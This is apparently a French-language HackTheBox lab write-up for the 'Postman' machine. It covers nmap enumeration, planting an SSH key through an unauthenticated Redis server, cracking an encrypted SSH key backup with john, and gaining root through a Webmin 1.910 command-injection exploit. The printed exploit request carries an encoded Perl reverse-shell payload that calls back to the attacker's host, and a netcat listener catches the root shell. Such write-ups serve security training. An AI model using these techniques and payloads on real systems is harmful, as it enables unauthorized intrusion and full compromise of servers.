---
title: HTB | Postman
description: Postman is an easy difficulty Linux machine, which features a Redis server running without authentication. This service can be leveraged to write an SSH public key to the user's folder. An encrypted SSH private key is found, which can be cracked to gain user access. The user is found to have a login for an older version of Webmin. This is exploited through command injection to gain root privileges.
slug: postman-htb
date: 2025-03-13 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Postman cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Postman</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.10.160</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Users
```bash
## SSH key pass phrase
matt : computer2008
```

## Enumeration

### nmap
```bash
┌──(kali㉿kali)-[~/htb/Postman]
└─$ nmap -sC -sV -An -T4 -vvv -p- 10.10.10.160  

PORTSTATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDem1MnCQG+yciWyLak5YeSzxh4HxjCgxKVfNc1LN+vE1OecEx+cu0bTD5xdQJmyKEkpZ+AVjhQo/esF09a94eMNKcp+bhK1g3wqzLyr6kwE0wTncuKD2bA9LCKOcM6W5GpHKUywB5A/TMPJ7UXeygHseFUZEa+yAYlhFKTt6QTmkLs64sqCna+D/cvtKaB4O9C+DNv5/W66caIaS/B/lPeqLiRoX1ad/GMacLFzqCwgaYeZ9YBnwIstsDcvK9+kCaUE7g2vdQ7JtnX0+kVlIXRi0WXta+BhWuGFWtOV0NYM9IDRkGjSXA4qOyUOBklwvienPt1x2jBrjV8v3p78Tzz
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIRgCn2sRihplwq7a2XuFsHzC9hW+qA/QsZif9QKAEBiUK6jv/B+UxDiPJiQp3KZ3tX6Arff/FC0NXK27c3EppI=
|   256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF3FKsLVdJ5BN8bLpf80Gw89+4wUslxhI3wYfnS+53Xd
80/tcp    open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-favicon: Unknown favicon MD5: E234E3E8040EFB1ACD7028330A956EBF
|_http-title: The Cyber Geek's Personal Website
|_http-server-header: Apache/2.4.29 (Ubuntu)
6379/tcp  open  redis   syn-ack Redis key-value store 4.0.9
10000/tcp open  http    syn-ack MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 91549383E709F4F1DD6C8DAB07890301
```

## Foothold

### Redis server

```bash
$ nc 10.10.10.160 6379
info
$2729
## Server
redis_version:4.0.9
...
```
Ou
```bash
┌──(kali㉿kali)-[~]
└─$ nmap --script redis-info -sV -p 6379 10.10.10.160
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-13 08:55 EDT
Nmap scan report for postman (10.10.10.160)
Host is up (0.015s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 4.0.9 (64 bits)
| redis-info: 
|   Version: 4.0.9
|   Operating System: Linux 4.15.0-58-generic x86_64
|   Architecture: 64 bits
|   Process ID: 656
|   Used CPU (sys): 4.58
|   Used CPU (user): 1.78
|   Connected clients: 1
|   Connected slaves: 0
|   Used memory: 820.55K
|   Role: master
|   Bind addresses: 
|     0.0.0.0
|     ::1
|   Client connections: 
|_    10.10.14.13
```

### redis user - SSH key upload
A l'aide la page de hacktricks pentest de Redis (port 6379):
https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html

On teste plusieurs exploit. Finalement, on réussi à upload une clé ssh et à se connecter à l'utilisateur redis.
```bash
┌──(kali㉿kali)-[~/htb/Postman]
└─$ ssh-keygen ...
...
┌──(kali㉿kali)-[~/htb/Postman]
└─$ (echo -e "\n\n"; cat ./id_rsa.pub; echo -e "\n\n") > spaced_key.txt
  
┌──(kali㉿kali)-[~/htb/Postman]
└─$ cat spaced_key.txt    

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMg9HyTSSz/I3DToPpGZ7w5G9qM5cOWCoJB0YfaEngD1Biw1RQVRdcBtQyRa+mnJinaK5h2moZHxJyVagxmxjBrAGm0lB+kQnSNZsYFlSuPAKGu3kW/0xA2xQJMq3g5m9WkFZZVkuV++eCjFj0txnNOOKK1m92hWopoH6oK5UcIdDRPbI7gE+Ju6zTEWUcTZuSpVDhMYfwIsct3kkXIGERsvTESX7I9amEgzPN25B7a5vhbSoey/rb0FHvKP2Fg9AL+fUht/6p5YM8qQRxq/G2S7enRCH2G564hzyBOqr9sIILow7Skf1dJgR1ODI0nVQ6oMKWLz/Ef6h7KPn95/GCHDzrlFJkLNWgRsYTHDsv+fcaev26NDYSV/RIwPo2HhiecJqWBNuixObj/XCA533f3zaqx8XjnDQOkR2RZciZLh7V+unC4Kvm2XyQTwJ0wFWSP4IUxzTYaDCjMIRXpWTxka95lP/4/MPm++m7VmNDYN6ODO+UPpowzT4AuW2i78E= kali@kali

  
┌──(kali㉿kali)-[~/htb/Postman]
└─$ cat spaced_key.txt | redis-cli -h 10.10.10.160 -x set ssh_key
OK
  
┌──(kali㉿kali)-[~/htb/Postman]
└─$ redis-cli -h 10.10.10.160   
10.10.10.160:6379> config set dir /var/lib/redis/.ssh
OK
10.10.10.160:6379> config set dbfilename "authorized_keys"
OK
10.10.10.160:6379> save
OK

┌──(kali㉿kali)-[~/htb/Postman]
└─$  ssh -i id_rsa redis@10.10.10.160
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)
...
Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1

redis@Postman:~$ whoami
redis
```

## redis -> Matt

### ssh key backup
Grâce à linpeas, on trouve un fichier .bak avec des clés ssh.
```bash
╔══════════╣ Backup files (limited 100)
-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak 
```
Cependant, il faut déchiffrer cette clé et trouver la passphrase. On peut la convertir avec **ssh2john** puis ensuite tenter de la cracker avec rockyou.txt et john bien sûr :
```bash
┌──(kali㉿kali)-[~/htb/Postman]
└─$ ssh2john ./matt.key > matt.hash

┌──(kali㉿kali)-[~/htb/Postman]
└─$ john --format=ssh matt.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (./matt.key)     
1g 0:00:00:00 DONE (2025-03-13 11:08) 3.333g/s 822720p/s 822720c/s 822720C/s comunista..comett
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
On trouve la passphrase ! `computer2008`

On peut même déchiffrer définitevement la clé pour ne plus écrire le mot de passe:
```bash
┌──(kali㉿kali)-[~/htb/Postman]
└─$ openssl rsa -in matt.key -out matt.decrypted_key -passin pass:computer2008     
writing RSA key
```
Cependant, la connexion SSH ne fonctionne pas. La clé n'est plus la bonne, mais la passphrase avec lequel elle etait chiffré nous a permis de nous connecter ensuite avec un "su" depusi le shell précédemment obtenu (user: redis) :
```bash
redis@Postman:/opt$ su Matt
Password: 
Matt@Postman:/opt$ whoami
Matt
```

### Matt - user flag
```bash
Matt@Postman:/opt$ cd 
Matt@Postman:~$ ls
user.txt
Matt@Postman:~$ cat user.txt 
9259.....a41d
```

## Privilege Escalation

### Authenticated RCE on webmin 1.910
On avait répérer au début de l'énumeration de la machine, que le service webmin pouvait potentiellement etre vulnérable à une RCE mais il fallait être connecté avec un utilisateur pour pouvoir l'exploiter. Nous avons désormais l'utilisateur Matt avec son mot de passe (computer2008).

En faisant quelques recherches sur internet, on trouve un script python sur github permettant d'exploiter cette vulnérabilité et d'executer des commandes.

En executant linpeas avec l'utilisateur Matt, et meme avec l'utilisateur redis, nous avions remarqué que webmin était executé en tant que root sur la machine ! En arrivant a exploiter la RCE sur webmin, on pourrait donc executer des commandes en tant que root :

```bash
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                                                    
                ╚════════════════════════════════════════════════╝                                                                                                                    
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
...
redis       656  0.0  0.3  51576  3648 ?        Ssl  10:44   0:13 /usr/bin/redis-server 0.0.0.0:6379
root        672  0.0  1.6 331332 14812 ?        Ss   10:44   0:00 /usr/sbin/apache2 -k start
www-data    673  0.0  1.1 335856 10116 ?        S    10:44   0:00  _ /usr/sbin/apache2 -k start
www-data    674  0.0  1.0 335840 10056 ?        S    10:44   0:00  _ /usr/sbin/apache2 -k start
www-data    675  0.0  1.1 335856 10120 ?        S    10:44   0:00  _ /usr/sbin/apache2 -k start
...

root        751  0.0  3.1  95308 29348 ?        Ss   10:44   0:02 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
## ^^^
## |||
## |||
```
On execute le python permettant d'exploiter webmin et on obtient un shell en tant que root:
( https://github.com/NaveenNguyen/Webmin-1.910-Package-Updates-RCE/tree/master )

```bash
┌──(kali㉿kali)-[~/htb/Postman]
└─$ python3 webmin_exploit.py --ip_address 10.10.10.160 --port 10000 --lhost 10.10.14.13 --lport 1337 --user Matt --password computer2008

Webmin 1.9101- 'Package updates' RCE
[+] Generating Payload...
[+] Reverse Payload Generated : u=acl%2Fapt&u=%20%7C%20bash%20-c%20%22%7Becho%2CcGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxMC4xMC4xNC4xMzoxMzM3Iik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0%2BZmRvcGVuKCRjLHcpO3doaWxlKDw%2BKXtpZigkXz1%2BIC8oLiopLyl7c3lzdGVtICQxO319Oyc%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22&ok_top=Update+Selected+Packages
[+] Attempting to login to Webmin
[+] Login Successful
[+] Attempting to Exploit
[+] Exploited Successfully

----------------------------------------

┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.160] 41548
whoami
root
cat /root/root.txt
a417.....1153
```